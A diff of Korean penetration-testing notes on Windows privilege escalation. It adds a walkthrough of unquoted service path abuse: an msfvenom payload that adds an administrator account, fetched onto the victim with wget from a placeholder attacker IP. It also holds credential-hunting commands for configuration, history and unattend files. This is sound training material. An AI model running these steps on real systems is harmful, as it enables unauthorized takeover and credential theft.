@@ -206,7 +206,7 @@
 	ForEach-Object { "[+] Potential plaintext creds: $($_.Name)" }
 ```
 
-**설정 파일을 이용한 비밀 정보 수집 시나리오(PowerShell)**
+#### 🧪 설정 파일을 이용한 비밀 정보 수집 시나리오(PowerShell)
 
 1. `cd C:` + `ls`
 - CouchDB 설치 확인됨, 설정 파일의 비밀정보 수집을 위해
@@ -233,7 +233,7 @@ admin = Password123!
 ```
 CouchDB 패스워드 정보가 Password123! 임을 확인
 
-**히스토리파일 이용한 비밀 정보 수집 시나리오(PowerShell)**
+#### 🧪 히스토리파일 이용한 비밀 정보 수집 시나리오(PowerShell)**
 1. `Get-PSReadLineOption`
 - PowerShell에서 히스토리 파일 저장 위치 확인:
 - 출력 예시:
@@ -243,6 +243,7 @@ CouchDB 패스워드 정보가 Password123! 임을 확인
 - 해당 경로의 파일을 열어 명령어 기록 확인:
 - `cat C:\Users\redracoon\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
 
+---
 
 ### 2. Unattended 파일
 **Unattended 파일**은 자동화된 호스트 프로비저닝, 설치, 설정 과정에 사용되는 파일로, 사람이 없어도 설치와 설정이 가능하도록 만들어진 구성 파일임.
@@ -264,17 +265,19 @@ CouchDB 패스워드 정보가 Password123! 임을 확인
   ./install-googlechrome.ps1 -u Administrator -p 'Password123!'
   ```
 
-- **작업 스케줄(Task Scheduler) 생성 시 계정 정보
+- **작업 스케줄(Task Scheduler) 생성 시 계정 정보**
   ```powershell
   New-ScheduledTaskAction [...] -u Administrator -p [...]
   ```
 - **주요 파일 위치**
+
   C:\Windows\Panther\unattend.xml  
   C:\Windows\Panther\unattended.xml  
   C:\Windows\Panther\unattend\unattend.xml  
   C:\Windows\Panther\unattend\unattended.xml
   C:\Windows\System32\Sysprep\sysprep.inf  
   C:\Windows\System32\Sysprep\sysprep.xml
+
 
 - **PowerShell을 활용한 검색 명령어**
   ```powershell
@@ -289,7 +292,7 @@ CouchDB 패스워드 정보가 Password123! 임을 확인
   [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))
   
   ```
-**Unattended 파일 이용한 비밀 정보 수집 시나리오(PowerShell)**
+#### 🧪 Unattended 파일 이용한 비밀 정보 수집 시나리오(PowerShell)**
 
 1. PowerShell로 Unattended 파일 탐색
 - 해당 명령어를 통해 C:\Windows\ 경로에서 unattend.xml 파일 확인
@@ -335,6 +338,7 @@ admin 계정과 Base64로 암호화된 계정 정보를 포함하고 있음
 ```
 - 프록시 서버 IP 확인 및 자격 증명(proxyadmin, Password123@)이 노출되어 추가 공격 가능
 
+---
 
 ### 3. Credential Manager
 
@@ -379,5 +383,106 @@ ls -Force
 - 결과는 암호화된 바이너리 파일로 나타나며, 이는 DPAPI로 암호화된 상태
 - Mimikatz와 같은 도구를 통해 이 암호화를 해제
 
+---
+
+### 4. Unquoted Service Path
+
+Windows 환경에서 `Unquoted Service Path` 취약점은 **서비스 실행 파일 경로에 큰 따옴표("")가 생략되고 공백이 포함된 경우**, 공격자가 **우선 탐색되는 경로에 악의적인 실행 파일을 배치하여 서비스 권한으로 실행**하게 하는 기법
 
 
+#### ✅ 개요
+
+- 윈도우의 서비스는 `ImagePath`라는 속성을 통해 실행할 바이너리의 경로를 지정한다. (ex. C:\apache\apache.exe)
+- 윈도우 운영체제는 해당 경로를 `CreateProcess()` WinAPI를 통해 실행하며, 이때 아래처럼 호출함.
+  ```cpp
+  CreateProcess(ImagePath, p1, p2, ...)
+  ```
+
+- 아래 두 조건을 **동시에 만족**하면 Unquoted Service Path 취약점이 발생합니다:
+- **ImagePath에 큰따옴표가 없음**
+- **경로에 공백이 존재함**
+
+#### ✅ 취약점 발생 원리
+
+- `CreateProcess`의 첫 번째 인자(`lpApplicationName`)는 실행할 바이너리의 전체 경로임
+- 경로에 공백이 있으나 큰따옴표로 감싸지지 않은 경우, Windows는 경로를 아래 순서로 해석하며, 공백 기준으로 앞부분을 바이너리 파일로 인식해 우선 실행을 시도함
+
+예시:
+- 경로: `C:\Optional Programs\Red Raccoon\apache.exe`
+- 탐색 순서:
+1. `C:\Optional.exe` 실행 시도 (없으면 실패)
+2. `C:\Optional Programs\Red.exe` 실행 시도 (없으면 실패)
+3. `C:\Optional Programs\Red Raccoon\apache.exe` 실행 (존재 시 성공)
+- **즉 디렉터리 이름에 공백이 존재하는 경우 공백 앞의 단어.exe를 바이너리 이름으로 인식하여 실행하게 됨**
+
+- 공격자는 이 로직을 악용해, 서비스 실행 시 우선 탐색되는 경로에 악성 파일(`C:\Optional.exe` 또는 `C:\Optional Programs\Red.exe`)을 배치
+
+#### ✅ 공격 성공 조건
+- **공격자는 악성 파일(`C:\Optional.exe` 또는 `C:\Optional Programs\Red.exe`)을 배치하기 위해 `C:\`, `C:\Optional Programs` 에 파일을 쓸 수 있는 권한이 있어야 함**
+- **서비스를 재시작하거나 시스템을 재부팅할 수 있어야 함**
+- **고객사 사전 허락 필수** (실제 공격 시도 전 반드시 승인을 받아야 함).
+
+#### 🧪 Unquoted Service Path을 이용한 권한 상승 시나리오
+
+Step 1. 취약 서비스 탐지
+```powershell
+Get-WmiObject Win32_Service | where-Object { $.StartMode -eq 'Auto' -and $.PathName -notlike 'C:\Windows*' -and $_.PathName -notmatch '^\s*"."\s$' } | Select-Object Name, DisplayName, PathName, StartMode
+```
+- **설명**
+  - 시스템의 자동 시작 서비스 중, 실행 파일 경로가 `C:\Windows\` 하위가 아니고, 따옴표로 감싸지지 않은 서비스만 필터링
+
+- **예시 결과**
+  Name : Abyss Web Server
+  DisplayName : Abyss Web Server
+  PathName : C:\opt\Abyss Web Server\abyssws
+  StartMode : Auto
+
+→ `C:\opt\Abyss Web Server\abyssws` 경로가 따옴표로 감싸지지 않고 공백이 포함되어 취약점 존재 확인
+
+
+Step 2. 공격 성공 조건을 위한 쓰기 권한 확인
+```powershell
+icacls C:\opt\
+```
+- **예시 결과**
+  BUILTIN\Users:(OI)(CI)(F)
+- **(OI): Object Inherit** - 하위 파일에 권한 상속
+- **(CI): Container Inherit** - 하위 폴더에 권한 상속
+- **(F): Full Control** - 읽기/쓰기/실행/삭제 등 모든 권한
+  → 모든 유저가 해당 경로에 파일을 쓸 수 있음 (공격 가능)
+
+
+Step 3. 공격 페이로드 생성 및 배포
+- **칼리 리눅스에서 페이로드 생성**
+
+```
+msfvenom -p windows/x64/exec CMD="net localgroup Administrators redraccoon /add" -f exe-service -o Abyss.exe
+```
+- `-p windows/x64/exec` : 명령 실행 페이로드
+- `CMD="net localgroup Administrators redraccoon /add"` : redraccoon 계정을 관리자 그룹에 추가
+- `-f exe-service` : 서비스 실행 파일 포맷 **(일반 exe와 다름, 서비스로 동작)**
+- `-o Abyss.exe` : 출력 파일명
+
+
+- **공격 파일 배포**
+- 칼리에서 웹서버 실행:
+  ```
+  python3 -m http.server 80
+  ```
+- 피해자 시스템에서 다운로드:
+  ```
+  wget http://<공격IP>/Abyss.exe -OutFile C:\opt\Abyss.exe
+  ```
+
+Step 4. 서비스 재시작 및 권한 상승 확인
+- **서비스 재시작**
+```powershell
+Restart-Service Abyss Web Serve
+```
+
+- **권한 상승 확인**
+```powershell
+net localgroup Administrators
+```
+
+- `redraccoon` 계정이 관리자 그룹에 추가되어 있으면 성공
